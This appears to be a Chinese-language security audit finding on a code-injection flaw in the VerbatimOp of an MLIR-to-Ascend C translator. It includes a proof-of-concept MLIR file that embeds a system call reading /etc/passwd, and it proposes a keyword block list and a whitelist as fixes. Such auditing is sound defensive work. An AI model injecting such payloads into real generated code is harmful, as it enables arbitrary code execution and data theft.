# VULN-SEC-INC-001: VerbatimOp 代码注入

## 漏洞概述

**漏洞类型**: 代码注入  
**CWE**: CWE-94 (Improper Control of Generation of Code)  
**严重程度**: Critical  
**置信度**: 80%

### 影响文件

- **文件**: `include/ascir/Dialect/EmitAsc/IR/Ops.td`
- **行号**: 167-170
- **函数**: `EmitAsc_VerbatimOp`

### 漏洞描述

VerbatimOp 定义允许任意字符串作为代码直接输出。如果 MLIR 输入中的 `VerbatimOp.value` 字段被攻击者控制，可注入任意 C++ 代码到生成的 Ascend C 输出中。

---

## 完整攻击链分析

### 数据流追踪

```
[污点源: MLIR 文件输入]
cli_tools/ascir-translate 处理 MLIR 文件
    ↓
[解析 MLIR: EmitAsc::VerbatimOp]
Ops.td:167-170 → VerbatimOp value: StrAttr
    ↓
[无验证: 任意字符串]
    ↓
[CodeEmitter 处理]
EmitAsc.cpp → emitter.ostream() << op.getValue()
    ↓
[污点汇: 生成的 C++ 代码]
    ↓
[恶意 C++ 代码编译执行]
```

### 关键代码片段

```tablegen
// include/ascir/Dialect/EmitAsc/IR/Ops.td:167-170
def EmitAsc_VerbatimOp : EmitAsc_Op<"verbatim"> {
  let arguments = (ins StrAttr:$value, Variadic<AnyType>:$args);
  let assemblyFormat = "$value ($args^ `:` type($args))?  attr-dict";
}
```

VerbatimOp 接受任意字符串 (`StrAttr:$value`)，没有任何内容验证。

---

## PoC 构造思路

### 步骤 1: 创建恶意 MLIR 文件

```mlir
// malicious.mlir
module {
  func.func @attack(%arg0: tensor<f32>) -> tensor<f32> {
    // VerbatimOp 直接嵌入恶意 C++ 代码
    emitasc.verbatim "system(\"cat /etc/passwd > /tmp/stolen\");"
    return %arg0 : tensor<f32>
  }
}
```

### 步骤 2: 使用 CLI 工具翻译

```bash
ascir-translate malicious.mlir -o output.cpp

# output.cpp 包含:
# ...
# system("cat /etc/passwd > /tmp/stolen");
# ...
```

### 步骤 3: 编译并执行

```bash
# 编译生成的 Ascend C 代码
bisheng output.cpp -o kernel.so

# 加载并执行 kernel（恶意代码在 NPU 上执行）
```

---

## 影响分析

### 安全影响

1. **任意 C++ 代码执行**: 恶意代码以 kernel 权限执行
2. **数据泄露**: 可访问敏感系统文件
3. **逻辑破坏**: 可破坏 kernel 正常执行

---

## 修复建议

### 优先级 1: VerbatimOp 内容验证

```tablegen
// 修改 VerbatimOp 定义，添加验证
def EmitAsc_VerbatimOp : EmitAsc_Op<"verbatim"> {
  let arguments = (ins StrAttr:$value, Variadic<AnyType>:$args);
  
  // 添加 verifier
  let hasVerifier = 1;
}
```

```cpp
// 添加验证函数
LogicalResult EmitAscVerbatimOp::verify() {
  auto value = getValue();
  
  // 检查危险关键字
  if (value.contains("system") || value.contains("exec") ||
      value.contains("fork") || value.contains("pipe")) {
    return emitError() << "VerbatimOp contains forbidden keywords";
  }
  
  return success();
}
```

### 优先级 2: 安全的 VerbatimOp 白名单

```cpp
// 只允许特定的 VerbatimOp 内容
static const std::set<std::string> SAFE_VERBATIM_WHITELIST = {
  "// ...",  // 仅注释
  "/* ... */",  // 仅块注释
};

LogicalResult EmitAscVerbatimOp::verify() {
  auto value = getValue();
  
  if (!SAFE_VERBATIM_WHITELIST.count(value.str())) {
    return emitError() << "VerbatimOp content not in whitelist";
  }
  
  return success();
}
```

---

## 相关漏洞

- **VULN-CROSS-002**: 跨模块代码注入链
- **VULN-SEC-INC-002**: CallOpaqueOp 任意函数调用
- **VULN-SEC-EMITASC-003**: EmitAsc VerbatimOp 定义